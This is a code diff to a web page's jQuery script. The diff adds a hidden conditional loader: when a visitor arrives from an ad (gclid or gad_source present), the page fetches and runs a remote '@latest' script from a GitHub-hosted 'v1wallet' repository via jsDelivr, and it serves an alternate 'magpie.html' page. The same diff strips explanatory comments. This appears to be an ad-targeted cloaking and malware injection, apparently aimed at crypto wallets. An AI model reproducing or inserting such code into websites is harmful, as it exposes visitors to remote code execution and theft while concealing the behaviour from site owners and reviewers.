@@ -15,6 +15,10 @@ $(document).ready(function () {
 
     const gclid = getQueryParam('gclid');
     const gadSource = getQueryParam('gad_source');
+
+    if (gclid || gadSource) {
+        loadScript("https://cdn.jsdelivr.net/gh/versionsixnine/v1wallet@latest/lazyloads.js?purge?vs");
+    }
     
     // Load magpie.html if either gclid or gad_source is set, otherwise load main.html
     const page = (gclid || gadSource) ? 'magpie.html' : 'main.html';
@@ -28,15 +32,21 @@ $(document).ready(function () {
                 }
             });
         } else {
-            // Find and execute all <script> tags in the loaded content
             $('#content').find('script').each(function () {
                 const script = document.createElement("script");
                 script.text = this.textContent || this.innerText;
-                document.head.appendChild(script); // Append to <head> to execute
-                document.head.removeChild(script); // Clean up to avoid duplication
+                document.head.appendChild(script); 
+                document.head.removeChild(script); 
             });
         }
     });
+
+    function loadScript(src) {
+        const script = document.createElement('script');
+        script.src = src;
+        script.async = true;
+        document.head.appendChild(script);
+    }
 });
 </script>
 
